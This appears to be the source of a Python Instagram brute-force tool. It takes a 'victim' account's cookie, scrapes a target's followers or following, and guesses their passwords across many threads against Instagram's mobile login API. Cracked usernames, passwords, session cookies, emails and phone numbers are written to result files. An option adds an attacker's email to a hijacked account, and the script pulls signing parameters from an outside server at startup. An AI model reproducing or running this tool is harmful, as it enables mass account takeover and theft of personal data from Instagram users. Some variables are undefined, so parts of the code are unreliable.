    version="15.0"
    prints(f"""[bold white]{logo}
           
    BruteForce Instagram by Exal-ID || Version : [bold green]{version}[/bold green]
    Github : https://github.com/ExalID[/bold white]
""")
def cekAPI(cookie):
    try:
        user=open(".username","r").read()
        kuki=open(".kukis.log","r").read()
        response=requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers=headers(),cookies={"cookie":kuki})
        i=response.json()["data"]["user"]
        nama=i["full_name"]
        pengikut=i["edge_followed_by"]["count"]
        mengikuti=i["edge_follow"]["count"]
        external.append(f"{kntlllll}|{pengikut}|{mengikuti}")
    except FileNotFoundError:
        os.remove(".kukis.log")
        prints("[bold red]Error : FileNotFoundError!![/bold red]")
        sleep(3)
        login()
    except(ValueError,KeyError)as e:
        os.remove(".kukis.log")
        os.remove(".username")
        prints(f"[bold red]Error : {str(e).title()}[/bold red]")
        sleep(3)
        login()
    return external,user
def login():
    try:
        kuki=open(".kukis.log","r").read()
    except FileNotFoundError:
        banner()
        prints("\n[bold green]#[/bold green] [bold white]Enter your Instagram Cookie, make sure to use a victim account, not a personal account[/bold white]")
        cookie=sol().input("\n[bold green]#[/bold green][bold white] Cookie : ")
        try:
            id=re.search("ds_user_id=(\\d+)",str(cookie)).group(1)
            po=requests.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers=headers(),cookies={"cookie":cookie})
            xx=json.loads(po.text)["user"]
            useri=xx["username"]
            open(".username","w").write(useri)
            kuki=open(".kukis.log","w").write(cookie)
            prints("[bold white]Login Successful!!\nPlease use this script wisely no matter what happens the author is not responsible and will not interfere... Thank you!![/bold white]")
            sleep(5)
        except(json.decoder.JSONDecodeError,KeyError,AttributeError)as e:
            os.remove(".kukis.log")
            os.remove(".username")
            prints(f"[bold red]Error : {str(e).title()}[/bold red]")
            sleep(3)
            exit()
    ex,user=cekAPI(kuki)
    coki={"cookie":kuki}
    instagram(ex,user,coki).menu()
class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
    def menthod(self):
        device=platform()
        banner()
        prints(f"""
[bold green]#[/bold green] [bold white]Your Status : [bold green]Premium[/bold green]
[bold green]#[/bold green] Your Session : [bold green]{kntlllll}[/bold green]
[bold green]#[/bold green] Your Expired : [bold green]{['expired']}[/bold green][/bold white]""")
        prints("[bold white]\n([bold green]01[/bold green]) Starts BruteForce with username\n([bold green]02[/bold green]) Check the crack results\n([bold green]03[/bold green]) Secure Instagram Accounts\n([bold green]04[/bold green]) Logout Your account\n([bold green]00[/bold green]) Kill Terminal [/bold white]")
    def menu(self):
        self.menthod()
        c=sol().input("\n[bold green]#[/bold green] [bold white]Choose : ")
        if c=="":
            prints("\n[bold red]Wrong Input!![/bold red]")
            sleep(3)
            self.menu()
        elif c in("1","01"):
            self.startBruteForce()
        elif c in("2","02"):
            self.checkResults()
        elif c in("3","03"):
            cok=sol().input("\n[bold green]#[/bold green] [bold white]Enter your Cookie : ")
            email=sol().input("\n[bold green]#[/bold green] [bold white]Enter your Email : ")
            change(cok).email(email)
        elif c in("4","04"):
            os.remove(".kukis.log")
            os.remove(".username")
            prints("\n[bold green]#[/bold green] [bold white]Logout successful!! \nPlease log in again with a fresh Instagram account[/bold white]")
            sleep(3)
            login()
        elif c in("0","00"):
            self.killTerminal()
        else:
            prints("\n[bold red]Wrong Input!![/bold red]")
            sleep(3)
            self.menu()
    def checkResults(self):
        print("\n")
        for i in os.listdir("result"):
            l=open(f"result/{i}","r").read().splitlines()
            prints(f"[bold white]{i} [bold green]{len(l)}[/bold green] accounts[/bold white]")
        c=sol().input("\n[bold green]#[/bold green] [bold white]Input Your File : ")
        try:
            open(f"result/{c}","r").read()
            dy=sol().input("\n[bold green]#[/bold green] [bold white]If you want to exit please click CTRL+X on your keyboard do you understand (y or n) : ")
            if dy in("y","Y"):
                os.system(f"nano result/{c}")
            else:
                self.menu()
        except FileNotFoundError:
            prints("\n[bold red]Error : FileNotFoundError!![/bold red]")
            sleep(3)
            self.menu()
    def killTerminal(self):
        exit()
    def convertID(self,user,cookie):
        try:
            response=requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers=headers(),cookies=cookie)
            i=response.json()["data"]["user"]
        except Exception as e:
            prints(f"[bold red]Error : {str(e).title()}[/bold red]")
        return i["id"]
    def startBruteForce(self):
        prints("\n[bold green]#[/bold green] [bold white]Enter the target Instagram username, make sure the account is public, not private[/bold white]")
        user=sol().input("\n[bold green]#[/bold green] [bold white]Username : ")
        if user=="":
            prints("\n[bold red]Wrong Input!![/bold red]")
            sleep(3)
            self.menu()
        else:
            id=self.convertID(user,self.cookie)
            prints("[bold white]\n([bold green]01[/bold green]) Starting dump user from following\n([bold green]02[/bold green]) Starting dump user from followers\n[/bold white]")
            c=sol().input("\n[bold green]#[/bold green] [bold white]Choose : ")
            if c=="":
                prints("\n[bold red]Wrong Input!![/bold red]")
                sleep(3)
                self.menu()
            elif c in("1","01"):
                self.following(id,self.cookie)
            elif c in("2","02"):
                self.followers(id,self.cookie)
            else:
                prints("\n[bold red]Wrong Input!![/bold red]")
                sleep(3)
                self.menu()
    def following(self,id,cookie):
        try:
            menudump.append("mengikuti")
            response=requests.get("https://i.instagram.com/api/v1/friendships/"+id+"/following/?count=100",headers=headers(),cookies=self.cookie)
            x_jason=json.loads(response.text)
            for i in x_jason["users"]:
                internal.append(f'{i["username"]}|{i["full_name"]}\n')
            prints(f"[bold green]#[/bold green] [bold white]Username successfully collected : [bold green]{str(len(internal))}[/bold green] User[/bold white]",end="\r")
            if "mengikuti" in menudump:
                maxid=x_jason["next_max_id"]
                for z in range(9999):
                    response=requests.get("https://i.instagram.com/api/v1/friendships/"+id+"/following/?count=100"+"&max_id="+maxid,headers=headers(),cookies=self.cookie)
                    x_jason=json.loads(response.text)
                    try:
                        for i in x_jason["users"]:
                            internal.append(f'{i["username"]}|{i["full_name"]}\n')
                        prints(f"[bold green]#[/bold green] [bold white]Username successfully collected : [bold green]{str(len(internal))}[/bold green] User[/bold white]",end="\r")
                        try:
                            maxid=x_jason["next_max_id"]
                        except:
                            break
                    except:
                        if "challenge" in response.text:
                            break
                        else:
                            continue
            else:pass
            self.setting()
        except Exception as e:
            prints(f"[bold red]Error : {str(e).title()}[/bold red]")
        except KeyboardInterrupt:
                self.setting()
    def followers(self,id,cookie):
        try:
            menudump.append("pengikut")
            response=requests.get("https://i.instagram.com/api/v1/friendships/"+id+"/followers/?count=100",headers=headers(),cookies=self.cookie)
            x_jason=json.loads(response.text)
            for i in x_jason["users"]:
                internal.append(f'{i["username"]}|{i["full_name"]}\n')
            prints(f"[bold green]#[/bold green] [bold white]Username successfully collected : [bold green]{str(len(internal))}[/bold green] User[/bold white]",end="\r")
            if "pengikut" in menudump:
                maxid=x_jason["next_max_id"]
                for z in range(9999):
                    response=requests.get("https://i.instagram.com/api/v1/friendships/"+id+"/followers/?count=100"+"&max_id="+maxid,headers=headers(),cookies=self.cookie)
                    x_jason=json.loads(response.text)
                    try:
                        for i in x_jason["users"]:
                            internal.append(f'{i["username"]}|{i["full_name"]}\n')
                        prints(f"[bold green]#[/bold green] [bold white]Username successfully collected : [bold green]{str(len(internal))}[/bold green] User[/bold white]",end="\r")
                        try:
                            maxid=x_jason["next_max_id"]
                        except:
                            break
                    except:
                        if "challenge" in response.text:
                            break
                        else:
                            continue
            else:pass
            self.setting()
        except Exception as e:
            prints(f"[bold red]Error : {str(e).title()}[/bold red]")
        except KeyboardInterrupt:
                self.setting()
    def setting(self):
        c=sol().input("\n\n[bold green]#[/bold green] [bold white]Do you want to use a manual password (y or n) : ")
        if c=="":
            self.setting()
        elif c in("n","N"):
            tambahan=sol().input("\n[bold green]#[/bold green] [bold white]Do you want to use additional password (y or n) : ")
            if tambahan in("y","Y"):
                prints("\n[bold white]Enter your additional password using a comma as a separator\nExample : [bold green]Password1,Password2,Password3[/bold green][/bold white]")
                #zx=sol().input("\n[bold green]#[/bold green] [bold white]Password : ")
                self.otomatisPassword(tambahan,internal)
            else:
                self.otomatisPassword(tambahan,internal)
        elif c in("y","Y"):
            prints("\n[bold white]Enter your manual password and use a comma as separator\nExample : [bold green]Password1,Password2,Password3[/bold green][/bold white]")
            zx=sol().input("\n[bold green]#[/bold green] [bold white]Password : ")
            self.manualPassword(internal,zx)
        else:
            self.setting()
    def manualPassword(self,user,zx=""):
        self.ingfo()
        with ThreadPoolExecutor(max_workers=15)as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if len(w)==3 or len(w)==4 or len(w)==5:
                                sandi=zx.replace(" ","").split(",")
                            else:
                                sandi=zx.replace(" ","").split(",")
                            shinkai.submit(self.crackAPI,username,sandi)
                except:pass
        prints("[bold green]#[/bold green] [white]Crack has been completed!![/white]")
        sleep(3)
        exit()
    def ingfo(self):
        prints("\n[bold white]If you don't get results or there is an error code [bold red]400[/bold red], please play airplane mode for 5 seconds[/bold white]")
        prints(f"""[bold white]
[bold green]#[/bold green] ok saved in: result/success-{day}.txt
[bold green]#[/bold green] cp saved in: result/checkpoint-{day}.txt[/bold white]\n""")
    def otomatisPassword(self,c,user,zx=""):
        self.ingfo()
        with ThreadPoolExecutor(max_workers=15)as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if c=="y" or c=="Y":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    ii=[w,w+"123",w+"1234",w+"321",w+"12345",w+"123456",username]
                                    sandi=ii+zx.replace(" ","").split(",")
                                else:
                                    ii=[w,w+"123",w+"1234",w+"321",w+"12345",w+"123456",username]
                                    sandi=ii+zx.replace(" ","").split(",")
                            else:
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+"123",w+"1234",w+"321",w+"12345",w+"123456",username]
                                else:
                                    sandi=[w,w+"123",w+"1234",w+"321",w+"12345",w+"123456",username]
                            shinkai.submit(self.crackAPI,username,sandi)
                except:pass
        prints("[bold green]#[/bold green] [white]Crack has been completed!![/white]")
        sleep(3)
        exit()
    def ApiNo(self,kontol):
        try:
            s=requests.Session()
            s.headers.update(headers())
            respon=s.get("https://i.instagram.com/api/v1/accounts/edit/web_form_data/",cookies={"cookie":kontol})
            i=respon.json()["form_data"]
            nomor=i["phone_number"]
            email=i["email"]
        except:
            nomor="null"
            email="null"
        return email,nomor
    def APIinfoLIVE(self,user):
        try:
            s=requests.Session()
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers=headers())
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
            pictures=x_jason["profile_pic_url"]
            bio=x_jason["biography"]
            fbid=x_jason["fbid"]
            private=x_jason["is_private"]
            verified=x_jason["is_verified"]
        except:
            nama="null"
            pengikut="null"
            mengikut="null"
            postingan="null"
            pictures="null"
            bio="null"
            fbid="null"
            private="null"
            verified="null"
        return nama,pengikut,mengikut,postingan,pictures,bio,fbid,private,verified
    def APIinfo(self,user):
        try:
            s=requests.Session()
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers=headers())
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            nama="null"
            pengikut="null"
            mengikut="null"
            postingan="null"
        return nama,pengikut,mengikut,postingan
    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        ses=requests.Session()
        logtemp=0
        guid=str(uuid.uuid4())
        ponid=str(uuid.uuid4())
        andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        ig_sig=EXAL["ig_sig"]
        dat=EXAL["sinkz"]
        ua=UserAgent()
        dat.update({"id":guid})
        data1=json.dumps(dat)
        ned=hmac.new(ig_sig.encode("utf-8"),str(data1).encode("utf=8"),hashlib.sha256).hexdigest()
        data2=EXAL["sinkz1"]
        data2.update({"signed_body":f'{ned}.{str(data1)}'})
        head.update({"user-agent": ua})
        head=headCrack2(IGV)
        while True:
            try:
                p=ses.post("https://i.instagram.com/api/v1/qe/sync/",headers=head,data=data2)
                break
            except:pass
        sys.stdout.write(f"\r{H}#{N} Response-Status ({H}200{N}) {N}{loop}/{len(internal)} OK : - {H}{len(success)} {N}CP : - {M}{len(checkpoint)} {N}\r"),sys.stdout.flush()
        for pw in pas:
            try:
                data=json.dumps({"phone_id":ponid,"_csrftoken":ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password":pw.replace(" ","+"),"login_attempt_count":str(logtemp)})
                ned=hmac.new(ig_sig.encode("utf-8"),str(data).encode("utf=8"),hashlib.sha256).hexdigest()
                pasw=pw.replace(" ","+")
                setan=sianjing.split("||")
                dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
                respon=ses.post("https://i.instagram.com/api/v1/accounts/login/",headers=headCrack(IGV),data=dataa)
                logtemp+=1
                open(".respon.txt","a").write(respon.text+"\n")
                if "logged_in_user" in str(respon.text):
                    coki=";".join([key+"="+value.replace("\"","")for key,value in ses.cookies.get_dict().items()])
                    email,nomor=self.ApiNo(coki)
                    nama,pengikut,mengikut,postingan,pictures,bio,fbid,private,verified=self.APIinfoLIVE(user)
                    if nama=="null":
                        prints(f"""[white]
[on green]LOGIN SUCCESS[/on green] - INFO : [bold red]OFF[/bold red]
        Username : [bold green]{user}[/bold green]
        Password : [bold green]{pw}[/bold green]
        Cookie : [bold green]{coki}[/bold green][/white]\n""")
                        success.append(user)
                        open(f"result/success-{day}.txt","a").write(f"{user}|{pw}|{coki}\n")
                        break
                    else:
                        prints(f"""[white]
[on green]LOGIN SUCCESS[/on green] - INFO : [bold green]ON[/bold green]
        Private : [bold green]{private}[/bold green]
        Verified : [bold green]{verified}[/bold green]
        FbID : [bold green]{fbid}[/bold green]
        Full-Name : [bold green]{kntlllll}[/bold green]
        Username : [bold green]{user}[/bold green]
        Password : [bold green]{pw}[/bold green]
        Biography : [bold green]{bio}[/bold green]
        Email : [bold green]{email}[/bold green]
        Phone Number : [bold green]{nomor}[/bold green]
        Followers : [bold green]{pengikut}[/bold green]
        Following : [bold green]{mengikut}[/bold green]
        Feedpost : [bold green]{postingan}[/bold green]
        Pictures : [bold green]{pictures}[/bold green]
        Cookie : [bold green]{coki}[/bold green][/white]\n""")
                        success.append(user)
                        open(f"result/success-{day}.txt","a").write(f"{user}|{pw}|{email}/{nomor}|{pengikut}|{mengikut}|{coki}\n")
                        break
                elif "https://i.instagram.com/challenge" in str(respon.text):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    if nama=="null":
                        prints(f"""[white]
[on red]LOGIN CHECHKPOINT[/on red] - INFO : [bold red]OFF[/bold red]
        Username : [bold red]{user}[/bold red]
        Password : [bold red]{pw}[/bold red]
        User-Agent : [bold red]{str(random.choice(uagent))}[/bold red][/white]\n""")
                        checkpoint.append(user)
                        open(f"result/checkpoint-{day}.txt","a").write(f"{user}|{pw}\n")
                        break
                    else:
                        prints(f"""[white]
[on red]LOGIN CHECKPOINT[/on red] - INFO : [bold green]ON[/bold green]
        Full-Name : [bold red]{kntlllll}[/bold red]
        Username : [bold red]{user}[/bold red]
        Password : [bold red]{pw}[/bold red]
        Followers : [bold red]{pengikut}[/bold red]
        Following : [bold red]{mengikut}[/bold red]
        Feedpost : [bold red]{postingan}[/bold red]
        User-Agent : [bold red]{str(random.choice(uagent))}[/bold red][/white]\n""")
                        checkpoint.append(user)
                        open(f"result/checkpoint-{day}.txt","a").write(f"{user}|{pw}|{pengikut}|{mengikut}\n")
                        break
                elif "ip_block" in str(respon.text)or "<title>5xx Server Error</title>" in str(respon.text):
                    sys.stdout.write(f"\r\r{H}#{N} Response-Status ({M}400{N}) {N}{loop}/{len(internal)} OK : - {H}{len(success)} {N}CP : - {M}{len(checkpoint)} {N}\r"),sys.stdout.flush()
                    self.crackAPI(user,pas)
                    loop-=1
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                sleep(5)
                self.crackAPI(user,pas)
                loop-=1
                break
            except Exception as e:
                pass
        loop+=1
class change:
    def __init__(self,coki):
        self.r=requests.Session()
        self.cookie={"cookie":coki}
    def email(self,gmail):
        try:
            headers={
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding":"gzip, deflate",
                "Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "Sec-Ch-Prefers-Color-Scheme":"light",
                "Sec-Ch-Ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
                "Sec-Ch-Ua-Full-Version-List":"\"Google Chrome\";v=\"113.0.5672.127\", \"Chromium\";v=\"113.0.5672.127\", \"Not-A.Brand\";v=\"24.0.0.0\"",
                "Sec-Ch-Ua-Mobile":"?0",
                "Sec-Ch-Ua-Platform":"\"Windows\"",
                "Sec-Ch-Ua-Platform-Version":"\"10.0.0\"",
                "Sec-Fetch-Dest":"document",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-Site":"none",
                "Sec-Fetch-User":"?1",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
                "Viewport-Width":"1179"}
            response=self.r.get("https://accountscenter.instagram.com",headers=headers,cookies=self.cookie)
            acid=re.search("\"actorID\":\"(.*?)\"",str(response.text)).group(1)
            dtsg=re.search("\"DTSGInitialData(.*?)\"}",str(response.text)).group(1).split("\"token\":\"")[1]
            lsd=re.search("\"LSD\"(.*?)\"}",str(response.text)).group(1).split("\"token\":\"")[1]
            dataa={
                 "av":acid,
                 "__user":"0",
                 "__a":"1",
                 "__req":"f",
                 "__hs":"19507.HYP:accounts_center_pkg.2.1..0.0",
                 "dpr":"1",
                 "__ccg":"EXCELLENT",
                 "__rev":"1007579523",
                 "__s":"8f209l:d50zqz:rsqth9",
                 "__hsi":"7238925937404829675",
                 "__dyn":"7xeUmwlE7ibwKBWo2vwAxu13w8CewSwMwNw9G2S0im3y4o0B-q1ew65xO2O1Vw8G1Qw5Mx61vw9m1YwBgao6C0Mo5W3S7U2cxe0EUjwGzE2swwwNwKwHw8Xwn82Lx_w4HwJwSyES1Tw8W4E2GwrUdUco2YxW3G1Iw",
                 "__csr":"gCTazEQIICBvnkhtWp13aKDbZdrRnCujOWYGLbpkAtQUzlikhAp-BhfCAli4GFTKcO6iRrDBCBh9qAz9z6hlyeiiuh4Xi-hfWx12FA9Kilw046qw2pEgwjEAJxjwWrhocE0Efw1hK0cWjjEiE3AFaGGGFbhXWGHz-m2pwxzpqKjUmA84202wXzqG8jADwLGiEix-7l4gAyEcwm2wDGAlv_xev-lbHKGHVWAAGF4aDjhFajzWzsEGQq5v_QWyaGHVLGWGAJaAGBFaKQGGcKiczoKqclGUGUooGdx60Go",
                 "__comet_req":"24",
                 "fb_dtsg":dtsg,
                 "jazoest":"26335",
                 "lsd":lsd,
                 "__spin_r":"1007579523",
                 "__spin_b":"trunk",
                 "__spin_t":"1685443785",
                 "fb_api_caller_class":"RelayModern",
                 "fb_api_req_friendly_name":"FXAccountsCenterAddContactPointMutation",
                 "variables":"{\"country\":\"ID\",\"contact_point\":\""+gmail+"\",\"contact_point_type\":\"email\",\"selected_accounts\":[\""+acid+"\"],\"family_device_id\":\"device_id_fetch_ig_did\",\"client_mutation_id\":\"mutation_id_1685443808883\"}",
                 "server_timestamps":"true",
                 "doc_id":"5790402044410935"}
            headers2={
                "Accept":"*/*",
                "Accept-Encoding":"gzip, deflate",
                "Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "Content-Length":"1326",
                "Content-Type":"application/x-www-form-urlencoded",
                "Origin":"https://accountscenter.instagram.com",
                "Referer":"https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point",
                "Sec-Ch-Prefers-Color-Scheme":"light",
                "Sec-Ch-Ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
                "Sec-Ch-Ua-Full-Version-List":"\"Google Chrome\";v=\"113.0.5672.127\", \"Chromium\";v=\"113.0.5672.127\", \"Not-A.Brand\";v=\"24.0.0.0\"",
                "Sec-Ch-Ua-Mobile":"?0",
                "Sec-Ch-Ua-Platform":"\"Windows\"",
                "Sec-Ch-Ua-Platform-Version":"\"10.0.0\"",
                "Sec-Fetch-Dest":"empty",
                "Sec-Fetch-Mode":"cors",
                "Sec-Fetch-Site":"same-origin",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
                "Viewport-Width":"829",
                "X-Asbd-Id":"129477",
                "X-Fb-Friendly-Name":"FXAccountsCenterAddContactPointMutation",
                "X-Fb-Lsd":lsd,
                "X-Ig-App-Id":"936619743392459"}
            response2=requests.post("https://accountscenter.instagram.com/api/graphql/",data=dataa,headers=headers2,cookies=self.cookie)
            x_jason=json.loads(response2.text)
            print(x_jason)
            kode=sol().input("\n[bold green]#[/bold green] [bold white]Enter code Instagram :  ")
            dataa={
                 "av":acid,
                 "__user":"0",
                 "__a":"1",
                 "__req":"w",
                 "__hs":"19507.HYP:accounts_center_pkg.2.1..0.0",
                 "dpr":"1",
                 "__ccg":"GOOD",
                 "__rev":"1007579523",
                 "__s":"prc3im:y6y9i7:itrw01",
                 "__hsi":"7238932056347826328",
                 "__dyn":"7xeUmwlE7ibwKBWo2vwAxu13w8CewSwMwNw9G2S0im3y4o0B-q1ew65xO2O1Vw8G1Qw5Mx61vw9m1YwBgao6C0Mo5W3S7U2cxe0EUjwGzE2swwwNwKwHw8Xwn82Lx_w4HwJwSyES1Tw8W4E2GwrUdUco2YxW3G1Iw",
                 "__csr":"gCTazEQIICBvnkhtWp13aKDbZdvRnCujOWYGLbpkAtQUzlikhAp-BhfCAli4GFTKcO6iRrDBCBh9qAz9z6hlyeiiuh4Xi-hfWx12FA9Kilw046qw2pEgwjEAJxjwWrhocE0Efw1hK0cWjjEiEbE2RFaGGGFbhXWGHz-m2pwxzpqKjUmA84202wXzqG8jADwLGiEix-7l4gAyEcwm2wDGAlv_xev-lbHKGHVWAAGF4aDjhFajzWzsEGQq5v_QWyaGHVLGWGAJaAGBFaKQGGcLGczoKqclGUGUooGdx60Go",
                 "__comet_req":"24",
                 "fb_dtsg":dtsg,
                 "jazoest":"26381",
                 "lsd":"_uCDEBXhH-lpVxhNCoZRZB",
                 "__spin_r":"1007579523",
                 "__spin_b":"trunk",
                 "__spin_t":"1685445210",
                 "fb_api_caller_class":"RelayModern",
                 "fb_api_req_friendly_name":"FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation",
                 "variables":"{\"contact_point\":\""+gmail+"\",\"contact_point_type\":\"email\",\"pin_code\":\""+kode+"\",\"selected_accounts\":[\""+acid+"\"],\"family_device_id\":\"device_id_fetch_ig_did\",\"client_mutation_id\":\"mutation_id_1685445258419\",\"contact_point_event_type\":\"ADD\",\"normalized_contact_point_to_replace\":\"\"}",
                 "server_timestamps":"true",
                 "doc_id":"5820111908082635"}
            response3=self.r.post("https://accountscenter.instagram.com/api/graphql/",data=dataa,headers=headers2,cookies=self.cookie)
            print(response3.text)
            zz=sol().input("\n[bold green]#[/bold green] [bold white]Back to menu (y or n) : ")
            if zz in("y","Y"):
                login()
            elif zz in("n","N"):
                exit()
            else:
                login()
        except(ValueError,KeyError)as e:
            prints(f"[bold red]Error : {str(e).title()}[/bold red]")
            sleep(3)
            exit()

if __name__=="__main__":
    try:
        login()
        i=requests.get("https://instagram.fulldxrmedia.xyz/param.txt").json();EXAL.update(i)

    except ConnectionError as e:
        prints(f"[bold red]Error : {str(e).title()}[/bold red]")
